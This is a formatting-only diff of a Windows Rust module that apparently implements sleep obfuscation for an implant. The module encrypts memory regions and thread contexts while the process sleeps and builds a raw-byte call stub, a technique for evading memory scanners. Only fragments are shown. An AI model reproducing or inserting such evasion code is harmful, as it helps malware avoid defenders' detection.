@@ -27,13 +27,13 @@
 
 #![cfg(windows)]
 
-use common::lock::MutexExt;
 use anyhow::{anyhow, Result};
 use chacha20::cipher::KeyIvInit;
 use chacha20poly1305::{
     aead::{Aead, AeadInPlace, KeyInit, OsRng},
     XChaCha20Poly1305, XNonce,
 };
+use common::lock::MutexExt;
 use rand::RngCore;
 use std::sync::OnceLock;
 use zeroize::Zeroize;
@@ -125,10 +125,12 @@ struct RegionCacheEntry {
 static REGION_CACHE: OnceLock<std::sync::Mutex<RegionCacheEntry>> = OnceLock::new();
 
 fn region_cache() -> &'static std::sync::Mutex<RegionCacheEntry> {
-    REGION_CACHE.get_or_init(|| std::sync::Mutex::new(RegionCacheEntry {
-        generation: 0,
-        regions: Vec::new(),
-    }))
+    REGION_CACHE.get_or_init(|| {
+        std::sync::Mutex::new(RegionCacheEntry {
+            generation: 0,
+            regions: Vec::new(),
+        })
+    })
 }
 
 // ── Sleep variant ────────────────────────────────────────────────────────────
@@ -1725,26 +1727,20 @@ unsafe fn cronus_build_xchacha20_stub() -> Result<(usize, usize)> {
     #[cfg(target_arch = "x86_64")]
     let code: [u8; 12] = [
         // sub rsp, 0x28        ; shadow space + alignment (Windows x64 ABI)
-        0x48, 0x83, 0xEC, 0x28,
-        // call r8              ; call fn_ptr(rcx, rdx)
-        0x41, 0xFF, 0xD0,
-        // add rsp, 0x28
-        0x48, 0x83, 0xC4, 0x28,
-        // ret
+        0x48, 0x83, 0xEC, 0x28, // call r8              ; call fn_ptr(rcx, rdx)
+        0x41, 0xFF, 0xD0, // add rsp, 0x28
+        0x48, 0x83, 0xC4, 0x28, // ret
         0xC3,
     ];
 
     #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
     let code: [u8; 20] = [
         // stp x29, x30, [sp, #-16]!   ; save FP and LR, push frame
-        0xFD, 0x7B, 0xBF, 0xA9,
-        // mov x29, sp                  ; set frame pointer
-        0xFD, 0x03, 0x00, 0x91,
-        // blr x2                       ; call fn_ptr(x0, x1)
+        0xFD, 0x7B, 0xBF, 0xA9, // mov x29, sp                  ; set frame pointer
+        0xFD, 0x03, 0x00, 0x91, // blr x2                       ; call fn_ptr(x0, x1)
         0x20, 0x00, 0x3F, 0xD6,
         // ldp x29, x30, [sp], #16     ; restore FP and LR, pop frame
-        0xFD, 0x7B, 0xC1, 0xA8,
-        // ret                          ; return to caller
+        0xFD, 0x7B, 0xC1, 0xA8, // ret                          ; return to caller
         0xC0, 0x03, 0x5F, 0xD6,
     ];
 
@@ -1850,16 +1846,23 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     // encryption, because we need the threads suspended so they don't touch
     // the memory we're about to encrypt.
     #[cfg(all(windows, feature = "thread-ctx-encrypt"))]
-    let mut thread_ctx_snapshots: Option<Vec<crate::thread_context_encrypt::ThreadContextSnapshot>> = None;
+    let mut thread_ctx_snapshots: Option<
+        Vec<crate::thread_context_encrypt::ThreadContextSnapshot>,
+    > = None;
     #[cfg(all(windows, feature = "thread-ctx-encrypt"))]
     if config.encrypt_thread_contexts {
         match unsafe { crate::thread_context_encrypt::capture_and_encrypt_thread_contexts(&key) } {
             Ok(snapshots) => {
-                tracing::debug!("[sleep_obfuscation] captured {} thread contexts", snapshots.len());
+                tracing::debug!(
+                    "[sleep_obfuscation] captured {} thread contexts",
+                    snapshots.len()
+                );
                 thread_ctx_snapshots = Some(snapshots);
             }
             Err(e) => {
-                tracing::warn!("[sleep_obfuscation] thread context capture failed: {e:#}, continuing without");
+                tracing::warn!(
+                    "[sleep_obfuscation] thread context capture failed: {e:#}, continuing without"
+                );
             }
         }
     }
@@ -2082,7 +2085,9 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     // when they resume, preventing crashes from accessing encrypted pages.
     #[cfg(all(windows, feature = "thread-ctx-encrypt"))]
     if let Some(ref mut ctx_snaps) = thread_ctx_snapshots {
-        match unsafe { crate::thread_context_encrypt::decrypt_and_restore_thread_contexts(&key, ctx_snaps) } {
+        match unsafe {
+            crate::thread_context_encrypt::decrypt_and_restore_thread_contexts(&key, ctx_snaps)
+        } {
             Ok(()) => {
                 tracing::debug!("[sleep_obfuscation] thread contexts restored successfully");
             }
